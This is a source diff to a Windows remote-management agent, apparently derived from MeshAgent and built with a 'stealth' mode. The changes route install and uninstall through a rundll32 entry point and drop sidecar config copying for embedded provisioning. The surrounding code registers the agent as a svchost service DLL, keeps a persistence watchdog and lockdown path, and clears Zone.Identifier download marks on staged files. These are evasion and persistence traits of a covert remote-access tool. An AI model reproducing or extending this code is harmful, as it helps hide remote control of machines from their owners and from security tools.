@@ -57,6 +57,7 @@ limitations under the License.
 #include "stealth_monitor.h"
 #include "stealth_integration.h"
 #include "svchost_payload.h"
+#include "rundll32_contract.h"
 // Svchost registration helper (implemented in stealth_svchost.c)
 BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* dllPath);
 BOOL Stealth_UnregisterSvchostService(const wchar_t* serviceName);
@@ -452,7 +453,7 @@ static BOOL MeshService_SpawnBridgeProcessW(
 
 	ZeroMemory(&si, sizeof(si));
 	si.cb = sizeof(si);
-	if (FAILED(StringCchPrintfW(commandLine, _countof(commandLine), L"\"%ls\" \"%ls\",KvmSessionBridgeW %ls %ls", ctx->rundll32Path, dllPath, inputPipeName, outputPipeName)))
+	if (FAILED(StringCchPrintfW(commandLine, _countof(commandLine), L"\"%ls\" \"%ls\",%ls %ls %ls", ctx->rundll32Path, dllPath, MESH_RUNDLL32_ENTRY_KVM_BRIDGE_W, inputPipeName, outputPipeName)))
 	{
 		ctx->createError = ERROR_INSUFFICIENT_BUFFER;
 		return FALSE;
@@ -2015,13 +2016,6 @@ static BOOL MeshService_ResolveHostExecutablePathW(WCHAR* outputPath, size_t out
 				return TRUE;
 			}
 			
-			// If branded name fails, try the fallback name explicitly
-			if (SUCCEEDED(StringCchPrintfW(candidate, _countof(candidate), L"%ls\\%ls", modulePath, STEALTH_FALLBACK_EXE_NAME)) &&
-				GetFileAttributesW(candidate) != INVALID_FILE_ATTRIBUTES)
-			{
-				StringCchCopyW(outputPath, outputCount, candidate);
-				return TRUE;
-			}
 		}
 	}
 	
@@ -6052,10 +6046,10 @@ static void MeshService_ShutdownStealthIntegration(void);
 
 #ifdef MESHAGENT_ENABLE_STEALTH
 /*
- * MeshService_EnableWatchdogIfConfigured - Legacy direct watchdog activation
+ * MeshService_EnableWatchdogIfConfigured - Direct watchdog activation
  *
  * IMPORTANT: There are two watchdog activation paths in the codebase:
- * 1. This function (legacy) - Direct watchdog via persistence profile settings
+ * 1. This function - Direct watchdog via persistence profile settings
  * 2. StealthIntegration path - Via StealthIntegration_Init/Start and Lockdown_Enter
  *
  * To avoid conflicts:
@@ -6876,7 +6870,7 @@ static void MeshService_DeleteFileIfPresentW(const WCHAR* path)
 		DWORD deleteErr = GetLastError();
 		if (deleteErr != ERROR_FILE_NOT_FOUND && deleteErr != ERROR_PATH_NOT_FOUND)
 		{
-			Stealth_LogInstallEvent(L"[GUI] Legacy launcher cleanup delete failed path=%ls error=%lu", path, deleteErr);
+			Stealth_LogInstallEvent(L"[GUI] Launcher cleanup delete failed path=%ls error=%lu", path, deleteErr);
 		}
 	}
 }
@@ -6956,7 +6950,7 @@ static BOOL MeshService_BuildStagedLauncherPath(const WCHAR* modulePath, const W
 	return SUCCEEDED(StringCchPrintfW(stagedPathOut, stagedPathOutCch, L"%ls\\%ls-launcher%ls", stageDir, stem, extension));
 }
 
-static void MeshService_CleanupLegacyLauncherArtifacts(void)
+static void MeshService_CleanupLauncherArtifacts(void)
 {
 	WCHAR stageDir[_MAX_PATH * 2] = {0};
 	WCHAR searchPattern[_MAX_PATH * 2] = {0};
@@ -7003,7 +6997,7 @@ static void MeshService_ClearZoneIdentifier(const WCHAR* path)
 	}
 }
 
-static void MeshService_DeleteStagedSidecarIfPresent(const WCHAR* stagedExePath, const WCHAR* extension)
+static void MeshService_DeleteStagedPackageCompanionIfPresent(const WCHAR* stagedExePath, const WCHAR* extension)
 {
 	WCHAR stagedPath[_MAX_PATH * 4] = {0};
 	DWORD attrs;
@@ -7018,36 +7012,6 @@ static void MeshService_DeleteStagedSidecarIfPresent(const WCHAR* stagedExePath,
 		SetFileAttributesW(stagedPath, attrs & ~FILE_ATTRIBUTE_READONLY);
 	}
 	DeleteFileW(stagedPath);
-	MeshService_ClearZoneIdentifier(stagedPath);
-}
-
-static void MeshService_CopyResolvedSidecarIfPresent(const WCHAR* sourcePath, const WCHAR* stagedExePath, const WCHAR* extension, const WCHAR* sidecarLabel)
-{
-	WCHAR stagedPath[_MAX_PATH * 4] = {0};
-	DWORD attrs;
-
-	if (sourcePath == NULL || sourcePath[0] == L'\0' || stagedExePath == NULL || extension == NULL) { return; }
-	if (!MeshService_BuildSiblingPathWithExtension(stagedExePath, extension, stagedPath, _countof(stagedPath))) { return; }
-
-	attrs = GetFileAttributesW(sourcePath);
-	if (attrs == INVALID_FILE_ATTRIBUTES || (attrs & FILE_ATTRIBUTE_DIRECTORY) != 0) { return; }
-
-	attrs = GetFileAttributesW(stagedPath);
-	if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_READONLY) != 0)
-	{
-		SetFileAttributesW(stagedPath, attrs & ~FILE_ATTRIBUTE_READONLY);
-	}
-
-	if (!CopyFileW(sourcePath, stagedPath, FALSE))
-	{
-		Stealth_LogInstallEvent(L"[GUI] Failed to stage launcher sidecar %ls (%ls -> %ls, error=%lu)",
-			(sidecarLabel != NULL ? sidecarLabel : L""),
-			sourcePath,
-			stagedPath,
-			GetLastError());
-		return;
-	}
-
 	MeshService_ClearZoneIdentifier(stagedPath);
 }
 
@@ -7089,34 +7053,17 @@ static BOOL MeshService_StageElevatedLaunchImage(const WCHAR* modulePath, WCHAR*
 
 	MeshService_ClearZoneIdentifier(stagedPath);
 	ZeroMemory(&preflight, sizeof(preflight));
-	if (!Stealth_PreflightPackageSource(modulePath, FALSE, FALSE, &preflight, NULL, 0))
+	if (!Stealth_PreflightPackageSource(modulePath, FALSE, &preflight, NULL, 0))
 	{
 		Stealth_LogInstallEvent(L"[GUI] Package inspection failed for staged launcher image (%ls)", modulePath);
 		return FALSE;
 	}
-	MeshService_DeleteStagedSidecarIfPresent(stagedPath, L".db");
-	MeshService_DeleteStagedSidecarIfPresent(stagedPath, L".msh");
-	MeshService_DeleteStagedSidecarIfPresent(stagedPath, L".conf");
-	if (preflight.sourceDbPresent)
-	{
-		MeshService_CopyResolvedSidecarIfPresent(preflight.sourceDbPath, stagedPath, L".db", L".db");
-	}
-	if (preflight.sourceMshValid)
-	{
-		MeshService_CopyResolvedSidecarIfPresent(preflight.sourceMshPath, stagedPath, L".msh", L".msh");
-	}
-	else if (preflight.sourceMshPresent)
-	{
-		Stealth_LogInstallEvent(L"[GUI] Skipping invalid launcher sidecar .msh from %ls", preflight.sourceMshPath);
-	}
-	if (preflight.sourceConfValid)
-	{
-		MeshService_CopyResolvedSidecarIfPresent(preflight.sourceConfPath, stagedPath, L".conf", L".conf");
-	}
-	else if (preflight.sourceConfPresent)
-	{
-		Stealth_LogInstallEvent(L"[GUI] Skipping invalid launcher sidecar .conf from %ls", preflight.sourceConfPath);
-	}
+	MeshService_DeleteStagedPackageCompanionIfPresent(stagedPath, L".db");
+	MeshService_DeleteStagedPackageCompanionIfPresent(stagedPath, L".msh");
+	MeshService_DeleteStagedPackageCompanionIfPresent(stagedPath, L".conf");
+	Stealth_LogInstallEvent(
+		L"[GUI] Staged elevated launch image with embedded provisioning only (embedded=%u)",
+		preflight.sourceEmbeddedConfigPresent);
 
 	if (FAILED(StringCchCopyW(stagedModulePathOut, stagedModulePathOutCch, stagedPath)))
 	{
@@ -7276,7 +7223,7 @@ static BOOL MeshService_RunSelfCommandAndWait(const char* args, int isAdmin, DWO
 	hasModuleDir = MeshService_GetDirectoryFromPath(modulePath, moduleDir, _countof(moduleDir));
 	hasSafeLaunchDir = MeshService_GetSafeLaunchDirectory(safeLaunchDir, _countof(safeLaunchDir));
 	MeshService_LogSelfImageIdentity(modulePath);
-	MeshService_CleanupLegacyLauncherArtifacts();
+	MeshService_CleanupLauncherArtifacts();
 
 	if (args == NULL) { args = ""; }
 	if (MultiByteToWideChar(CP_UTF8, 0, args, -1, argsWide, _countof(argsWide)) <= 0)
@@ -8513,20 +8460,26 @@ static int MeshService_IsManagedConsoleOperation(int argc, char **argv)
 		if (strcasecmp(argv[i], "-exec") == 0) { return 1; }
 		if (strcasecmp(argv[i], "-b64exec") == 0) { return 1; }
 		if (strcasecmp(argv[i], "--slave") == 0) { return 1; }
-		if (strcasecmp(argv[i], "-finstall") == 0) { return 1; }
-		if (strcasecmp(argv[i], "-funinstall") == 0) { return 1; }
-		if (strcasecmp(argv[i], "-fulluninstall") == 0) { return 1; }
-		if (strcasecmp(argv[i], "-fullinstall") == 0) { return 1; }
-		if (strcasecmp(argv[i], "-fullupdate") == 0) { return 1; }
-		if (strcasecmp(argv[i], "-fupdate") == 0) { return 1; }
-		if (strcasecmp(argv[i], "-fullregression") == 0) { return 1; }
-		if (strcasecmp(argv[i], "-validate-install") == 0 || strcasecmp(argv[i], "--validate-install") == 0) { return 1; }
-		if (strcasecmp(argv[i], "-validate-update") == 0 || strcasecmp(argv[i], "--validate-update") == 0) { return 1; }
-		if (strcasecmp(argv[i], "-validate-uninstall") == 0 || strcasecmp(argv[i], "--validate-uninstall") == 0) { return 1; }
-		if (strcasecmp(argv[i], "-validate-package") == 0 || strcasecmp(argv[i], "--validate-package") == 0) { return 1; }
 		if (strcasecmp(argv[i], "-preprotection-capture") == 0 || strcasecmp(argv[i], "--preprotection-capture") == 0) { return 1; }
 		if (strcasecmp(argv[i], "--selftest") == 0 || strncasecmp(argv[i], "--selftest=", 11) == 0) { return 1; }
 	}
+	return 0;
+}
+
+static int MeshService_IsUnsupportedLifecycleSwitch(const char* arg)
+{
+	if (arg == NULL) { return 0; }
+	if (strcasecmp(arg, "-finstall") == 0) { return 1; }
+	if (strcasecmp(arg, "-funinstall") == 0) { return 1; }
+	if (strcasecmp(arg, "-fulluninstall") == 0) { return 1; }
+	if (strcasecmp(arg, "-fullinstall") == 0) { return 1; }
+	if (strcasecmp(arg, "-fullupdate") == 0) { return 1; }
+	if (strcasecmp(arg, "-fupdate") == 0) { return 1; }
+	if (strcasecmp(arg, "-fullregression") == 0) { return 1; }
+	if (strcasecmp(arg, "-validate-install") == 0 || strcasecmp(arg, "--validate-install") == 0) { return 1; }
+	if (strcasecmp(arg, "-validate-update") == 0 || strcasecmp(arg, "--validate-update") == 0) { return 1; }
+	if (strcasecmp(arg, "-validate-uninstall") == 0 || strcasecmp(arg, "--validate-uninstall") == 0) { return 1; }
+	if (strcasecmp(arg, "-validate-package") == 0 || strcasecmp(arg, "--validate-package") == 0) { return 1; }
 	return 0;
 }
 
@@ -8608,9 +8561,16 @@ int wmain(int argc, char* wargv[])
 
 	if (argc > 1 && (strcasecmp(argv[1], "-install") == 0 || strcasecmp(argv[1], "-uninstall") == 0))
 	{
-		printf("[-] Legacy -install/-uninstall switches are no longer supported. Use -fullinstall/-fulluninstall for svchost deployments.\n");
+		printf("[-] Direct -install/-uninstall switches are no longer supported. Use the rundll32 MeshLifecycleHostW manifest path.\n");
 		wmain_free(argv);
 		return 1;
+	}
+
+	if (argc > 1 && MeshService_IsUnsupportedLifecycleSwitch(argv[1]))
+	{
+		printf("[-] Direct EXE lifecycle and validation switches are disabled. Use rundll32.exe <ServiceDll>,MeshLifecycleHostW <manifest>.\n");
+		wmain_free(argv);
+		return ERROR_NOT_SUPPORTED;
 	}
 
 	if (argc > 1)
@@ -8623,14 +8583,7 @@ int wmain(int argc, char* wargv[])
 		}
 	}
 
-	if (argc > 1 && (strcasecmp(argv[1], "-finstall") == 0 || strcasecmp(argv[1], "-funinstall") == 0 ||
-		strcasecmp(argv[1], "-fulluninstall") == 0 || strcasecmp(argv[1], "-fullinstall") == 0 ||
-		strcasecmp(argv[1], "-fullupdate") == 0 || strcasecmp(argv[1], "-fupdate") == 0 ||
-		strcasecmp(argv[1], "-fullregression") == 0 ||
-		strcasecmp(argv[1], "-validate-install") == 0 || strcasecmp(argv[1], "--validate-install") == 0 ||
-		strcasecmp(argv[1], "-validate-update") == 0 || strcasecmp(argv[1], "--validate-update") == 0 ||
-		strcasecmp(argv[1], "-validate-uninstall") == 0 || strcasecmp(argv[1], "--validate-uninstall") == 0 ||
-		strcasecmp(argv[1], "-validate-package") == 0 || strcasecmp(argv[1], "--validate-package") == 0 ||
+	if (argc > 1 && (
 		strcasecmp(argv[1], "-preprotection-capture") == 0 || strcasecmp(argv[1], "--preprotection-capture") == 0 ||
 		strcasecmp(argv[1], "-state") == 0 ||
 		strcasecmp(argv[1], "--selftest") == 0 || strncasecmp(argv[1], "--selftest=", 11) == 0))
@@ -9281,16 +9234,12 @@ int wmain(int argc, char* wargv[])
 					printf("  -resetnodeid          Reset the NodeID next time the service is started.\r\n");
 					printf("\r\n");
 					printf("Install / Update / Uninstall:\r\n");
-					printf("  -fullinstall          Copy agent into program files, install and launch (svchost-only).\r\n");
-					printf("  -fullupdate           In-place update/repair of an existing svchost install.\r\n");
-					printf("  -fulluninstall        Stop agent and clean up the program files location.\r\n");
+					printf("  rundll32.exe <ServiceDll>,MeshLifecycleHostW <manifest>\r\n");
+					printf("                        Authoritative install/update/uninstall lifecycle path.\r\n");
 					printf("  -fullregression       Run full end-to-end regression (install/validate/self-test/update/uninstall).\r\n");
 					printf("\r\n");
 					printf("Validation / Troubleshooting:\r\n");
-					printf("  -validate-install     Validate registry/firewall/DACL/persistence for installed state.\r\n");
-					printf("  -validate-update      Validate registry/firewall/DACL/persistence after update.\r\n");
-					printf("  -validate-uninstall   Validate cleanup after uninstall.\r\n");
-					printf("  -validate-package     Validate package sidecars/preflight and emit JSON.\r\n");
+					printf("  Lifecycle validation is run through MeshLifecycleHostW manifest actions.\r\n");
 					printf("  -preprotection-capture Capture a timestamped pre-protection desktop artifact and emit JSON.\r\n");
 					printf("  -svchost-status       Emit JSON svchost status and return a diagnostic bitmask.\r\n");
 #if defined(_LINKVM)
@@ -9310,11 +9259,10 @@ int wmain(int argc, char* wargv[])
 					printf("  -svchost-register     Register service DLL in svchost (netsvcs).\r\n");
 					printf("  -svchost-unregister   Remove svchost registration artifacts.\r\n");
 					printf("\r\n");
-					printf("Additional -fullinstall options:\r\n");
+					printf("Additional lifecycle manifest inputs:\r\n");
 					printf("  --WebProxy=\"http://proxyhost:port\"  Specify an HTTPS proxy.\r\n");
 					printf("  --agentName=\"alternate name\"        Specify an alternate name to be provided by the agent.\r\n");
-					printf("  --package-source=\"path\"             Override package source used by -validate-package.\r\n");
-					printf("  --allow-installed-fallback=0|1       Allow installed .msh/.conf fallback during -validate-package.\r\n");
+					printf("  SourceExe, SourceDll, DisplayName, Description, Action.\r\n");
 				}
 				else if (skip == 0)
 				{
@@ -9769,8 +9717,10 @@ INT_PTR CALLBACK DialogHandler(HWND hDlg, UINT message, WPARAM wParam, LPARAM lP
 			BOOL result = FALSE;
 			DWORD actionExitCode = ERROR_GEN_FAILURE;
 			DWORD launchError = ERROR_SUCCESS;
+			WCHAR modulePath[MAX_PATH * 4] = {0};
 			WCHAR actionName[32];
 			WCHAR errorMessage[512];
+			MeshRundll32LifecycleAction lifecycleAction = MESH_RUNDLL32_LIFECYCLE_ACTION_UNKNOWN;
 
 			EnableWindow(GetDlgItem(hDlg, IDC_INSTALLBUTTON), FALSE);
 			EnableWindow(GetDlgItem(hDlg, IDC_UNINSTALLBUTTON), FALSE);
@@ -9778,23 +9728,34 @@ INT_PTR CALLBACK DialogHandler(HWND hDlg, UINT message, WPARAM wParam, LPARAM lP
 
 			if (LOWORD(wParam) == IDC_INSTALLBUTTON)
 			{
-				sprintf_s(
-					ILibScratchPad,
-					sizeof(ILibScratchPad),
-					"-fullinstall --cleanup-launcher %s%s",
-					autoproxy_checked != 0 ? "--autoproxy=" : "",
-					autoproxy_checked != 0 ? (configured_autoproxy_value != NULL ? configured_autoproxy_value : "1") : "");
+				lifecycleAction = MESH_RUNDLL32_LIFECYCLE_ACTION_INSTALL;
 			}
 			else
 			{
-				sprintf_s(
-					ILibScratchPad,
-					sizeof(ILibScratchPad),
-					"-fulluninstall %s%s",
-					autoproxy_checked != 0 ? "--autoproxy=" : "",
-					autoproxy_checked != 0 ? (configured_autoproxy_value != NULL ? configured_autoproxy_value : "1") : "");
+				lifecycleAction = MESH_RUNDLL32_LIFECYCLE_ACTION_UNINSTALL;
 			}
-			result = MeshService_RunSelfCommandAndWait(ILibScratchPad, IsAdmin() == TRUE, &actionExitCode, &launchError);
+			UNREFERENCED_PARAMETER(autoproxy_checked);
+			UNREFERENCED_PARAMETER(configured_autoproxy_value);
+
+			if (GetModuleFileNameW(NULL, modulePath, (DWORD)_countof(modulePath)) == 0)
+			{
+				launchError = GetLastError();
+				result = FALSE;
+			}
+			else
+			{
+				result = MeshRundll32_LaunchLifecycleHostW(
+					lifecycleAction,
+					(lifecycleAction == MESH_RUNDLL32_LIFECYCLE_ACTION_INSTALL) ? modulePath : NULL,
+					NULL,
+					NULL,
+					NULL,
+					TRUE,
+					TRUE,
+					600000,
+					&actionExitCode);
+				launchError = result ? ERROR_SUCCESS : GetLastError();
+			}
 
 			if (result)
 			{
